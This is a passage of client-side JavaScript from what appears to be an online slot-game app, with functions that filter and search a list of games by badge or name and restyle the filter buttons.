                <div style="font-size:10px; color:#666; margin-top:2px;">Pragmatic Play</div>
            </div>
        </div>
    `).join('');
}

let _activeFilter = 'all';

window.filterGames = function(type) {
    _activeFilter = type;
    // Buton stillerini güncelle
    ['all','hot','new','top','megaways'].forEach(id => {
        const btn = document.getElementById('filter-' + id);
        if (btn) btn.style.background = id === type ? '#1fcc5a' : '#1e2a38';
        if (btn) btn.style.color = id === type ? '#000' : '#fff';
    });
    let filtered = GAMES;
    if (type === 'hot')      filtered = GAMES.filter(g => g.badge === 'HOT');
    if (type === 'new')      filtered = GAMES.filter(g => g.badge === 'YENİ');
    if (type === 'top')      filtered = GAMES.filter(g => g.badge === 'TOP');
    if (type === 'megaways') filtered = GAMES.filter(g => g.name.toLowerCase().includes('megaways'));
    renderAppGamesGrid(filtered);
};

window.searchGames = function(query) {
    if (!query) { renderAppGamesGrid(); return; }
    const q = query.toLowerCase();
    renderAppGamesGrid(GAMES.filter(g => g.name.toLowerCase().includes(q)));
};
